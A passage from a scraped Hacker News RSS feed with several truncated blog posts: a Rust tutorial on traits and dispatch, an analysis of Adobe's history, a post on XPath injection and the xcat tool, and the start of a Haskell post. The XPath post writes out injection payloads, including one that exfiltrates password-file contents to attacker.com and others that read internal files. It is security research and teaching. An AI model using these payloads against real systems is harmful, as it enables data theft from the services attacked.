<p>Anyway enough talk, let‚Äôs write some Rust. Rust has a concept of traits, which
<a href="https://blog.rust-lang.org/2015/05/11/traits.html#traits-are-interfaces">are the Java equivalent of
interfaces</a><sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.
They define a common set of methods to be used across object types. Let‚Äôs throw
together some traits.</p>
<div><pre><code data-lang="rust"><span>trait</span> Worker {
    <span>fn</span> <span>receive_pay</span>(<span>&amp;</span>self) -&gt; <span>u32</span>;
}

<span>trait</span> SoftwareEngineer: <span>Worker</span> {
    <span>fn</span> <span>write_code</span>(<span>&amp;</span>self) -&gt; String;
}

<span>trait</span> Astronaut: <span>Worker</span> {
    <span>fn</span> <span>see_the_moon</span>(<span>&amp;</span>self);
}
</code></pre></div><p>These two traits are friends. SoftwareEngineer is a
<a href="https://doc.rust-lang.org/rust-by-example/trait/supertraits.html">SuperTrait</a>
that encapsulates the functionality of Worker. Implementors must also implement
worker if they would like to implement SoftwareEngineer. So far this looks like
piecemeal composition. Nothing exciting yet.</p>
<p>Let‚Äôs get some implementors.</p>
<p>First we are making some structs to hold traits for the implementors.</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>RustDev</span> {
    balance: <span>i32</span>,
}

<span>struct</span> <span>NasaWorker</span> {
    balance: <span>i32</span>,
}
</code></pre></div><p>And then we implement the above traits on them:</p>
<div><pre><code data-lang="rust"><span>impl</span> Worker <span>for</span> RustDev {
    <span>fn</span> <span>receive_pay</span>(<span>&amp;</span><span>mut</span> self) -&gt; <span>i32</span> {
        self.balance <span>+=</span> <span>50000</span>;
        self.balance
    }
}

<span>impl</span> SoftwareEngineer <span>for</span> RustDev {
    <span>fn</span> <span>write_code</span>(<span>&amp;</span>self) -&gt; String {
        <span>r#"panic!("At the software-co")"#</span>.to_owned()
    }
}

<span>impl</span> Worker <span>for</span> NasaWorker {
    <span>fn</span> <span>receive_pay</span>(<span>&amp;</span><span>mut</span> self) -&gt; <span>i32</span> {
        self.balance <span>+=</span> <span>1000000</span>;
        self.balance
    }
}

<span>impl</span> Astronaut <span>for</span> NasaWorker {
    <span>fn</span> <span>see_the_moon</span>(<span>&amp;</span>self) {
        println<span>!</span>(<span>"wow that's cool"</span>);
    }
}
</code></pre></div><p>Still nothing exciting here. So let‚Äôs change that a little. Now I want to start
using these types and we can really start leveraging our traits.</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    <span>let</span> engineer <span>=</span> RustDev { balance: <span>0</span> };
    <span>let</span> astronaut <span>=</span> NasaWorker { balance: <span>0</span> };
    println<span>!</span>(<span>"Engineer's balance: {}"</span>, pay_worker(engineer));
    println<span>!</span>(<span>"Astronaut's balance: {}"</span>, pay_worker(astronaut));
}

<span>fn</span> <span>get_astronaut</span>() -&gt; <span>impl</span> Astronaut {
    NasaWorker { balance: <span>0</span> }
}

<span>fn</span> <span>get_engineer</span>() -&gt; <span>impl</span> SoftwareEngineer {
    RustDev { balance: <span>0</span> }
}

<span>fn</span> <span>pay_worker</span>(<span>mut</span> worker: <span>impl</span> Worker) -&gt; <span>i32</span> {
    worker.receive_pay()
}
</code></pre></div><div><pre><code data-lang="sh">$ rustc trait-test.rs
$ ./trait-test
Engineer<span>'s balance: 50000
</span><span>Astronaut'</span>s balance: <span>1000000</span>
</code></pre></div><p>You can see we are generic over Worker and receive pay on both of them. Despite
not needing it, you‚Äôll note I made the <code>pay_worker</code> method take ownership of the
<code>Worker</code> argument. It doesn‚Äôt even use a reference.</p>
<p>This is the simplest and fastest way to pass generic objects around. It doesn‚Äôt
use dynamic dispatch. Rust knows ahead of time what your type is and just calls
the method.</p>
<p>Anyway let‚Äôs keep going with the examples. I want to get a bunch of these
workers, put them in a collection, and give them all pay.</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    <span>let</span> astronaut <span>=</span> get_astronaut();
    <span>let</span> engineer <span>=</span> get_engineer();
    give_em_pay(vec<span>!</span>[astronaut, engineer]);
}

<span>fn</span> <span>give_em_pay</span>(<span>mut</span> workers: Vec<span>&lt;</span><span>impl</span> Worker<span>&gt;</span>) {
    workers.iter_mut().for_each(<span>|</span>worker<span>|</span> {
        worker.receive_pay();
    });
}
</code></pre></div><div><pre><code data-lang="sh">$ rustc trait-test.rs 
error<span>[</span>E0308<span>]</span>: mismatched types
  --&gt; trait-test.rs:50:33
   |
<span>50</span> |     give_em_pay<span>(</span>vec!<span>[</span>astronaut, engineer<span>])</span>;
   |                                 ^^^^^^^^ expected opaque type, found a different opaque type
...
<span>63</span> | fn get_engineer<span>()</span> -&gt; impl Worker <span>{</span>
   |                      ----------- the found opaque type
   |
   <span>=</span> note:     expected type <span>`</span>impl Worker<span>`</span> <span>(</span>opaque type at &lt;trait-test.rs:59:23&gt;<span>)</span>
           found opaque type <span>`</span>impl Worker<span>`</span> <span>(</span>opaque type at &lt;trait-test.rs:63:22&gt;<span>)</span>
   <span>=</span> note: distinct uses of <span>`</span>impl Trait<span>`</span> result in different opaque types

error: aborting due to previous error

For more information about this error, try <span>`</span>rustc --explain E0308<span>`</span>.
</code></pre></div><p>Well that‚Äôs interesting. Everything implements Worker, but it‚Äôs just not
allowed. Even more interesting, if you replace the two SoftwareEngineer +
Astronaut with just Astronaut, it works!</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    <span>let</span> astronaut1 <span>=</span> get_astronaut();
    <span>let</span> astronaut2 <span>=</span> get_astronaut();
    give_em_pay(vec<span>!</span>[astronaut1, astronaut2]);
    println<span>!</span>(<span>"The workers are paid!"</span>);
}
</code></pre></div><div><pre><code data-lang="sh">$ rustc trait-test.rs
warning: <span>function</span> is never used: <span>`</span>get_engineer<span>`</span>
...

$ ./trait-test
The workers are paid!
</code></pre></div><p>That‚Äôs because static dispatch doesn‚Äôt allow for collections of implementors
unless the implementors are all the same. All <code>impl Trait</code>s must eventually
compile down to the same type, meaning there is no way to carry a collection of
traits using static dispatch if they compile to different implementations.</p>
<p>This is one of the most frustrating behaviors of static dispatch, as it makes it
very difficult to pass ownership of objects around in a generic way. If you need
ownership of said objects in a collection, you‚Äôll need to use dynamic dispatch.</p>
<h2 id="dynamic-dispatch-you-say">Dynamic dispatch you say?<a href="#dynamic-dispatch-you-say" arialabel="Anchor">‚åó</a> </h2>
<p>Yes, dynamic dispatch. Smarter folks have described it than me, so here is one
of their definitions.</p>
<p>Copied shamelessly from
<a href="https://en.wikipedia.org/wiki/Dynamic_dispatch">Wikipedia</a>:</p>
<blockquote>
<p>In computer science, dynamic dispatch is the process of selecting which
implementation of a polymorphic operation (method or function) to call at run
time. It is commonly employed in, and considered a prime characteristic of,
object-oriented programming (OOP) languages and systems.</p>
</blockquote>
<p>In short, the way dynamic dispatch works is:</p>
<ol>
<li>Have a pointer to an object</li>
<li>Carry a vtable with a set of pointers to that object‚Äôs implementation of
methods.</li>
<li>Figure out which to call at runtime through this indirection</li>
</ol>
<p>This indirection has a cost. It‚Äôs all figured out at runtime which makes it a
little slower. However we get vastly increased flexibility with dynamic
dispatch.</p>
<h2 id="so-how-does-it-work-with-rust">So how does it work with Rust?<a href="#so-how-does-it-work-with-rust" arialabel="Anchor">‚åó</a> </h2>
<p>The TL/DR is we have to throw our data behind a pointer. Heap or stack
allocated, method calls must be behind a pointer to the trait, and rustc will
figure out what to do from there.</p>
<p>Let‚Äôs change up our example a little:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    <span>let</span> <span>mut</span> astronaut <span>=</span> get_astronaut();
    <span>let</span> <span>mut</span> engineer <span>=</span> get_engineer();

    give_em_pay(vec<span>!</span>[<span>&amp;</span><span>mut</span> astronaut, <span>&amp;</span><span>mut</span> engineer]);
    println<span>!</span>(<span>"The workers are paid!"</span>);
}

<span>// notice the dyn  ------------------‚à®
</span><span></span><span>fn</span> <span>give_em_pay</span>(<span>mut</span> workers: Vec<span>&lt;&amp;</span><span>mut</span> dyn Worker<span>&gt;</span>) {
    workers.iter_mut().for_each(<span>|</span>worker<span>|</span> {
        worker.receive_pay();
    });
}
</code></pre></div><div><pre><code data-lang="sh">$ rustc trait-test.rs
$ ./trait-test
The workers are paid!
</code></pre></div><p>Run and no more compile errors! The only ‚Äúreal‚Äù change to the code was from
<code>impl</code> -&gt; <code>dyn</code> This has performance implications, but also opens up a world of
possibilities. For instance, you can see we now have an engineer and an
astronaut in the same array now.</p>
<p>We‚Äôre still using references here, but if we wrapped our astronaut and engineer
in a Box, we would own them in the vec. Nice!</p>
<h2 id="holding-traits">Holding traits<a href="#holding-traits" arialabel="Anchor">‚åó</a> </h2>
<p>No not like a hug, but in a struct. Let‚Äôs try it out real quick. Does this work?</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>WorkerHolder</span> {
    worker: <span>impl</span> Worker,
}
</code></pre></div><div><pre><code data-lang="sh">$ rustc trait-test.rs
error<span>[</span>E0562<span>]</span>: <span>`</span>impl Trait<span>`</span> not allowed outside of <span>function</span> and inherent method <span>return</span> types
  --&gt; trait-test.rs:48:13
   |
<span>48</span> |     worker: impl Worker,
   |             ^^^^^^^^^^^

error: aborting due to previous error
</code></pre></div><p>Well no. But that‚Äôs not because it doesn‚Äôt work. The error is a little
disingenuous.</p>
<p><code>impl</code> is syntactic sugar for a more verbose syntax that specifies data is
generic over a type. For some reason the <code>impl</code> syntactic sugar does not work
here. The proper syntax to make this work looks like so:</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>WorkerHolder</span><span>&lt;</span>T: <span>Worker</span><span>&gt;</span> {
    worker: <span>T</span>,
}
</code></pre></div><p>There isn‚Äôt much more excitement to talk about for static dispatch here, so
let‚Äôs move back to dynamic to discuss a few other quirks with it.</p>
<p>This is the proper syntax for holding a traits using dynamic dispatch:</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>ReferenceWorkerHolder</span><span>&lt;</span><span>'a</span><span>&gt;</span> {
    worker: <span>&amp;</span><span>'a</span> dyn Worker,
}

<span>struct</span> <span>BoxWorkerHolder</span> {
    worker: Box<span>&lt;</span>dyn Worker<span>&gt;</span>,
}
</code></pre></div><h2 id="owning-and-cloning">Owning and cloning<a href="#owning-and-cloning" arialabel="Anchor">‚åó</a> </h2>
<p>Let‚Äôs take a closer look at the boxed implementation. I‚Äôd like to pass the
worker into a method that looks like this:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>do_crazy_stuff_with_worker</span>(worker: Box<span>&lt;</span>dyn Worker<span>&gt;</span>) {
    <span>// fly to mars or something, I dunno
</span><span></span>}
</code></pre></div><p>Let‚Äôs make an astronaut and do crazy stuff with him twice. This method wants an
instance of the astronaut, and so we comply.</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    <span>let</span> <span>mut</span> holder <span>=</span> BoxWorkerHolder {
        worker: Box::new(get_astronaut()),
    };
    
    do_crazy_stuff_with_worker(holder.worker);
    do_crazy_stuff_with_worker(holder.worker);
}
</code></pre></div><div><pre><code data-lang="sh">$ vim trait-test.rs
$ rustc trait-test.rs
error<span>[</span>E0382<span>]</span>: use of moved value: <span>`</span>holder.worker<span>`</span>
  --&gt; trait-test.rs:61:16
   |
<span>60</span> |     pay_worker<span>(</span>holder.worker<span>)</span>;
   |                ------------- value moved here
<span>61</span> |     pay_worker<span>(</span>holder.worker<span>)</span>;
   |                ^^^^^^^^^^^^^ value used here after move
   |
   <span>=</span> note: move occurs because <span>`</span>holder.worker<span>`</span> has type <span>`</span>std::boxed::Box&lt;dyn ‚Ä¶</code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.darrien.dev/posts/so-you-want-to-object/">https://blog.darrien.dev/posts/so-you-want-to-object/</a></em></p>]]>
            </description>
            <link>https://blog.darrien.dev/posts/so-you-want-to-object/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945038</guid>
            <pubDate>Fri, 30 Oct 2020 17:59:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Evolution of Adobe and Future of Creative Software]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24944961">thread link</a>) | @yarapavan
<br/>
October 30, 2020 | https://645ventures.com/the-evolution-of-adobe-and-future-of-creative-software | <a href="https://web.archive.org/web/*/https://645ventures.com/the-evolution-of-adobe-and-future-of-creative-software">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" role="group"><div><div><h3><em>By <a href="https://www.linkedin.com/in/meha-patel/">Meha Patel</a> and <a href="https://www.linkedin.com/in/nnamdiokike/">Nnamdi Okike</a></em></h3><hr><p><img alt="mark-cruz-VW2oU66mwbc-unsplash" src="https://images.ctfassets.net/clfay1lxzjey/4Kivkm0e0GJ1RL4PmWU3qG/5856ffca944fe78f0164a9bb467dbffb/mark-cruz-VW2oU66mwbc-unsplash.jpg"></p><hr><p>Over the past 38 years, Adobe has built itself into a ~$245 billion market cap company by introducing and then dominating a new category: creative software. Over the next decade and beyond, we see this market evolving and enabling the emergence of multiple billion dollar startups that build upon Adobe‚Äôs foundation. These include several companies already well on their way such as Canva, Figma, and others. </p><p>In this article, we: i) introduce a framework for evaluating Adobe as a platform company; ii) analyze Adobe‚Äôs history and the factors that enabled its rise, iii) describe the technology &amp; behavioral waves catalyzing innovation, and iv) suggest areas of opportunity for emerging startups. More specifically, we highlight video workflows, analytics capabilities, and document alternatives as 3 key areas of opportunity, and also link a growing <a href="https://airtable.com/invite/l?inviteId=invL8RfK15a1yqHG1&amp;inviteToken=752ceb35a51bae83e02f6f454798d979e147d6f162b3bb3ad10ca0bc0b95a15c">repository</a> of startups in various creative software categories. Please feel free to read the entire article, or skip to the section(s) that are most interesting to you.</p><hr><h2>I. Introduction</h2><hr><p>Over the past few years, much attention has been paid to the ‚Äúunbundling‚Äù of companies including eBay, Craigslist, and Linkedin. The basis of the unbundling concept is that while the aggregation of multiple products and services initially results in network effects and scale economies in the first wave of a technology market, it also limits personalization, customization, and quality of experience. This creates an opportunity for new startups to displace the incumbent by providing more customized solutions as the market matures.</p><p>While the unbundling approach has worked well for startups attacking certain incumbents, it has limitations as a framework. This is particularly true for platform companies upon which new startups rely on in order to successfully build and distribute products. In these markets, innovation takes a more layered approach, with newer companies building upon a foundation laid by an incumbent. Rather than unbundling, we call this <em>an evolution</em> of a platform, and we believe that this is the best framework for evaluating Adobe, its innovation track record, and the startups innovating in this market today. </p><p>In comparison to better-known software giants in Silicon Valley, Adobe has flourished relatively quietly for much of its 38-year history. What began as a small publishing software company has now expanded into a conglomerate providing an extensive suite of products across its Creative, Document, and Experience Clouds. Today, Adobe employs over 22,000 employees and generates over $11 billion in revenue annually, with a market capitalization of ~$245 billion. <a href="">1</a></p><p>Along the way, it has made numerous transformative acquisitions, including Macromedia ($3.4 billion), Omniture ($1.8 billion), and Marketo ($4.8 billion). Its acquisition of Behance ($150 million) also enabled it to build the leading online platform to showcase and discover creative work. It has also successfully expanded into new pockets of creative software, which eventually yielded large business lines. Adobe‚Äôs ability to consistently innovate through organic and inorganic growth, while successfully transitioning leadership between different CEOs over multiple decades, is one of the tech industry‚Äôs great overlooked stories. The company‚Äôs Creative Cloud launch and move to a subscription-based pricing model at the end of 2013 precipitated a quadrupling of its market cap since that time. <a href="">2</a></p><p><img alt="Screen Shot 2020-10-14 at 12.09.42 PM" src="https://images.ctfassets.net/clfay1lxzjey/7nSKcMyD30evkeX4plmIQa/b0fb3bc9358b4724e76df9b2ae2b20bc/Screen_Shot_2020-10-14_at_12.09.42_PM.png"></p><blockquote><blockquote><p><strong><em>Adobe‚Äôs Stock Price Has Skyrocketed over the Past Two Decades</em></strong></p></blockquote></blockquote><p>As we explain below, we believe Adobe is entering a new phase, where new startups are building upon its platform and legacy. The growth of this new generation of startups is driven by technological and behavioral inflections. Rather than replace Adobe‚Äôs products, these startups are innovating  upon Adobe‚Äôs foundation to build a new generation of creative software. </p><hr><h2>II. The Growth of Adobe and its Significance</h2><hr><p>Adobe was founded by Chuck Geschke and John Warnock (above) to enable more accessible publishing and printing software.Throughout its first decade, Adobe aggressively targeted designers and creative professionals, creating new categories of software across graphics, photo, video, and publishing. Along with Apple, Adobe helped bring about the desktop publishing revolution, launching products such as Illustrator, Photoshop, and Acrobat. Over the past two decades, Adobe then made several transformative acquisitions, enabling it to expand into web-based products (Macromedia), enterprise analytics (Omniture), e-commerce software (Magento), and marketing automation software (Marketo). </p><p>We believe that Adobe‚Äôs success has been driven largely by the following three characteristics:</p><p>1) <strong>Successful Partnerships:</strong> From the very beginning, Adobe has secured successful partnerships through a thoughtful and strategic approach to choosing the right partners. Adobe‚Äôs first product, PostScript, was a page description language, which allowed users to print to external printers. Adobe understood that the proliferation of its software was dependent on high-quality hardware, and it strategically chose to partner with the best hardware company for creative users, Apple. In 1985, Apple debuted the LaserWriter printer with Postscript, and it was the first printer to use the language. Combined with a third partnership with Aldus Software, the trio established the desktop publishing revolution, and elevated Adobe‚Äôs positioning within the corporate ecosystem. Taking this further, Adobe capitalized on this position and cultivated deep partnerships with other large technology companies, such as IBM and Microsoft, ensuring it is deeply entrenched as the defacto creative software suite. </p><p>2) <strong>Ability to Bundle Products:</strong> Adobe has consistently been able to bundle its products into an integrated suite, while ensuring that value was strong enough for customers to pay a premium price for the bundle. In its early years, Adobe quickly amassed a wide variety of capabilities and was able to bundle new offerings with existing products to accelerate adoption. The company understood that the customer of that time wasn‚Äôt seeking point solutions, and instead wanted an integrated software solution that could solve multiple needs. Adobe has built on this strategy over time, culminating in the launch of its full product suite in 2003. What has been most unique about Adobe‚Äôs bundling approach is its ability to charge premium prices for the full subscription offering. For example, Adobe‚Äôs Creative Cloud offering is currently $80 per month for the base business license, or almost $1k per year. Adobe has an estimated 15 million paying subscribers today, evidencing the power of its integrated suite and the fact that Adobe is the standard. The network effects of Adobe‚Äôs products also enhance its lock-in. </p><p>3) <strong>Successful Acquisitions:</strong> Throughout its tenure, Adobe strategically selected acquisitions to enter into new markets, often choosing to buy versus build, and then subsequently successfully integrated those acquisitions. Adobe‚Äôs acquisition strategy is differentiated due to the fact that the company is not afraid to make large, bold bets, at same time dedicating the time and resources over a long period to ensure that these bets pay off. For example, Adobe‚Äôs $1.8 billion acquisition of Omniture in 2009 was seemingly off strategy and non-complementary. Why was a creative/design software company making such a large bet to acquire the leading player in enterprise analytics? Adobe understood that the future of marketing was uniting content creation with marketing analytics. Disciplines that were historically the purview of different enterprise departments would merge, and the rise of web/mobile analytics would enable a much tighter feedback loop within content creation and design. More than ten years later, the deal is seen as a brilliant strategic move that enabled Adobe to build its Experience Cloud.</p><p><img alt="Screen Shot 2020-10-14 at 12.14.59 PM" src="https://images.ctfassets.net/clfay1lxzjey/4E8RcynEAKHogL4YZDJccI/ebebfd21f11b47ddbe794c2778afa757/Screen_Shot_2020-10-14_at_12.14.59_PM.png"></p><blockquote><blockquote><p><strong><em>Adobe Has Made Several Successful Acquisitions over the Past Two Decades</em></strong></p></blockquote></blockquote><p>4) <strong>Transition to Cloud-based Company:</strong> In 2012, Adobe released Creative Cloud and fundamentally changed the way its products were offered, updated, and priced. While risky at the time, it enabled Adobe to transform the types of users they targeted and more importantly, stay relevant as more cloud-based competitors emerged. Growth in subscriptions for the Creative Cloud over the two years following launch can be seen below.</p><p><img alt="Screen Shot 2020-10-14 at 12.17.42 PM" src="https://images.ctfassets.net/clfay1lxzjey/16qjRVLN4x3x0fpmLeZHeB/18dbd03bacb9f8e0bbdfd8937dbbbd01/updated_chart.jpg"></p><p>How did Adobe accomplish its transition to becoming a cloud company, and why did they succeed where many large companies have stumbled? They succeeded through a series of strategic moves led by CEO Shantanu Narayen. These included the acquisition of Omniture, which enabled Adobe to immediately become the leader in enterprise cloud analytics. It also included the $150m acquisition of Behance, which provided the company with a large community of designers who desired to showcase creative work. By 2018, Behance had over 10 million users, 10x the number when it was acquired by Adobe.</p><p>Adobe was also willing to absorb the financial impact of switching from a one-time license of ~$1800 to a per-month subscription of $50 for its Creative Cloud software, which results in an initial revenue shortfall. Adobe did this over five years, first introducing Creative Cloud in April 2012, and not retiring its license option until January 2017.</p><p>Finally, Adobe displayed pragmatism in listening to the market where its products were not well-received. By far the most notable example was Adobe Flash. In 2010, Steve Jobs posted his letter ‚ÄúThoughts on Flash,‚Äù which criticized Flash and stated why Flash would not be allowed on iPhone, iPod Touch and iPad. While Adobe‚Äôs CEO Narayen initially fired back at Jobs, Adobe eventually decided to discontinue Flash and focus resources on HTML5. Through this move, Adobe displayed pragmatism, realizing that there was more money in building and acquiring SaaS apps than supporting media software on hardware ‚Ä¶</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://645ventures.com/the-evolution-of-adobe-and-future-of-creative-software">https://645ventures.com/the-evolution-of-adobe-and-future-of-creative-software</a></em></p>]]>
            </description>
            <link>https://645ventures.com/the-evolution-of-adobe-and-future-of-creative-software</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944961</guid>
            <pubDate>Fri, 30 Oct 2020 17:53:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[XPath injection issues are severely underrated]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24944846">thread link</a>) | @fanf2
<br/>
October 30, 2020 | https://tomforb.es/xcat-1.0-released-or-xpath-injection-issues-are-severely-underrated/ | <a href="https://web.archive.org/web/*/https://tomforb.es/xcat-1.0-released-or-xpath-injection-issues-are-severely-underrated/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><p>I‚Äôve just released <a href="https://github.com/orf/xcat" target="_blank">xcat 1.0</a>
and it‚Äôs
<a href="https://github.com/orf/xcat_app" target="_blank">demonstration application</a>
after like 5 years of on-off development. Feels good!</p><p>The genesis of xcat was when my boss, Sid, walked up to me out of the blue and asked if I wanted to go on an all
expenses paid trip to Amsterdam. Who the hell wouldn‚Äôt say yes to that proposition? <em>‚ÄúGreat! you‚Äôve got a month to write
a research paper on XPath injection flaws and we will present it at Blackhat Europe‚Äù</em>. Wait‚Ä¶ slow down! What‚Äôs XPath?!</p><p>As it turns out XPath is what you get when you combine the unholy trinity of <strong>XML</strong>, <strong>design-by-committee</strong> and
<strong>large quantities of drugs</strong>. But before I get into that here‚Äôs a short demo of me listing directories, reading
arbitrary files and dumping environment variables through a simple innocuous XPath injection flaw, using <code>xcat</code>:</p><center></center><p><em>I recommend reading a little bit about what XPath is and a little bit about blind injection vulnerabilities.
I wrote <a href="https://tomforb.es/exploiting-xpath-injection-vulnerabilities-with-xcat/">an introduction here</a>
or there
is the venerable <a href="https://www.owasp.org/index.php/XPATH_Injection" target="_blank">OWASP page on the topic</a>
.</em></p><h2 id="xpath-10">XPath 1.0</h2><p>So, back to large quantities of drugs. The year was 1999. Intel had just released the 800 MHZ Pentium III, Internet
Explorer 5.0 was the hot new browser and XML was all the rage.</p><p>All was not well in the land of XML though: parsing, filtering and generally using it was a huge pain. So some clever
people invented a nice, clean and concise syntax for querying it documents without any hassle:</p><p><code>//Employee[UserName/text()='tom']</code></p><p>Cool! This seems a lot simpler and more flexible than whatever manual parsing/iteration you‚Äôd come up with
in <code>$FAVORITE_LANGUAGE</code>. And this was XPath, the people rejoiced and the world was good.</p><p>Until 2010.</p><h2 id="xpath-20">XPath 2.0</h2><p>It was decided in 2010 that XPath 1.0 was too simple. What it clearly, <em>clearly</em> lacked was a weird type system
(it‚Äôs both strongly and weakly typed), a <a href="https://upload.wikimedia.org/wikipedia/commons/9/91/XQuery_and_XPath_Data_Model_type_hierarchy.png" target="_blank">greatly expanded type heirachy</a>
(seriously go look at that), <code>isinstance</code> checks, casting and a much larger function library.</p><p>Now don‚Äôt get me wrong: some of these are good changes. But what snuck into this version is the
<a href="https://maxtoroq.github.io/xpath-ref/fn/doc.html" target="_blank">fairly innocuous doc function</a>
. Seems simple - you can reference
external XML files in your query (almost like a join) and I‚Äôm sure there are use cases for this.</p><p>This function jumped right out at me when I was struggling
<a href="https://www.w3.org/TR/xpath20/" target="_blank">through the very, very dense XPath specification</a>
, wondering if I should just buy my
own bloody holiday to Amsterdam. What does <code>doc('https://attacker.com/xxe.xml')</code> do? Or
<code>doc('ftp://internalserver/passwords.xml')</code>? Or, heck, even <code>doc('gopher://server/something')</code>?</p><p>Turns out it does what you would expect. It makes the request. So now if you find an exploitable XPath injection flaw
you can make arbitrary network requests for any XML-like document you can find. If your internal services respond with
HTML that parses as XML that‚Äôs great! Or how about if all your Java/.NET configuration files are in XML, storing all
those juicy database passwords? That‚Äôs even better! <strong>We can now read them and download them via any XPath 2.0 injection
issue.</strong></p><p>Other than this the interesting thing is you can use this function to exfiltrate large quantities of data really
quickly. The specification very nicely includes <a href="https://maxtoroq.github.io/xpath-ref/fn/encode-for-uri.html" target="_blank">an encode-for-uri method</a>
,
so we could just do:</p><p><code>doc(string-join('http://attacker.com/?d', encode-for-uri(doc('passwords.xml')/some-node)))</code></p><p>Another cool issue is <a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank">external entity injection</a>
.
The tl;dr is you can serve up a malicious XML file that is requested by <code>doc()</code> that can read arbitrary files on the filesystem!</p><p>Awesome! <a href="https://xcat.readthedocs.io/en/latest/OOB-server/" target="_blank">xcat implements these attacks</a>
by the way.</p><p>The real kicker here is:</p><ul><li><p>You need to explicitly configure your XPath engine to protect against all of this, which inevitably nobody does because
nobody expects it. It‚Äôs just a simple query language, right?</p></li><li><p>There is no concept of parameterized queries like you have in every SQL adapter. It has to be done manually, and
it has to be done <strong>correctly in every input</strong>. If you miss something then you‚Äôre vulnerable to all of this!</p></li></ul><p>And this was XPath 2.0. Tom got to go to Amsterdam and
<a href="https://media.blackhat.com/bh-eu-12/Siddharth/bh-eu-12-Siddharth-Xpath-Slides.pdf" target="_blank">present at Black Hat Europe</a>
, and
the world was good.</p><p>Until 2014. At which point the drugs really kicked in.</p><h2 id="xpath-3031">XPath 3.0/3.1</h2><p>It was decided in 2014 that XPath 2.0 was too simple. What it clearly, <em>clearly</em> lacked was dynamic function calls,
for loops, introspection, array map/filter/reduce, associative arrays,
<a href="https://maxtoroq.github.io/xpath-ref/fn/load-xquery-module.html" target="_blank">dynamic module loading</a>
, JSON parsing,
inline functions, exceptions and tracebacks.</p><p>So now our lovely, simple XPath has evolved into:</p><pre><code>for-each(normalize-unicode(upper-case(json-doc('x.json'))) =&gt; tokenize("\s+"),
         function($a) {
            let $a := $a * 10
            load-xquery-module('abc'):some-func(
                        function-lookup($a, 1)(array:map($a, function($b) {
                                let $c := unparsed-text-lines($b)
                                trace($c)
                                if ($c) {
                                    return xml-to-json($b)
                                } else {
                                    error('This is an error')
                                }
                        })) 
            }
)
</code></pre><p>Yay! The future is here! Can you smell the progress?</p><p>Aside from trying to turn XPath into some JavaScript-esque abomination they also added three interesting functions:</p><ul><li><a href="https://maxtoroq.github.io/xpath-ref/fn/unparsed-text.html" target="_blank">unparsed-text</a></li><li><a href="https://maxtoroq.github.io/xpath-ref/fn/environment-variable.html" target="_blank">environment-variable</a></li><li><a href="https://maxtoroq.github.io/xpath-ref/fn/json-doc.html" target="_blank">json-doc</a></li></ul><p>With these we <strong>can read any arbitrary text files</strong>, and iterate through <strong>all environment variables</strong>.</p><p>Also if your internal webservice speaks JSON, well then buddy you‚Äôre in luck! A simple XPath injection flaw can let the
attacker read all of those responses using the handy JSON functions introduced in 3.1.</p><p>So by utilizing the same injection flaw and the same out-of-bound attack discussed above we can exfiltrate any readable
file on the filesystem, or network, quickly and cleanly.</p><h2 id="summary">Summary</h2><p>I‚Äôm sure they are already working on XPath 4.0. I wonder if they will add access to raw network sockets, or hell, maybe
DirectX support. Why not?</p></div></div></section></div>]]>
            </description>
            <link>https://tomforb.es/xcat-1.0-released-or-xpath-injection-issues-are-severely-underrated/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944846</guid>
            <pubDate>Fri, 30 Oct 2020 17:43:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell: The Good Parts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24944673">thread link</a>) | @anentropic
<br/>
October 30, 2020 | https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55 | <a href="https://web.archive.org/web/*/https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There‚Äôs been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it‚Äôs ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That‚Äôs how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
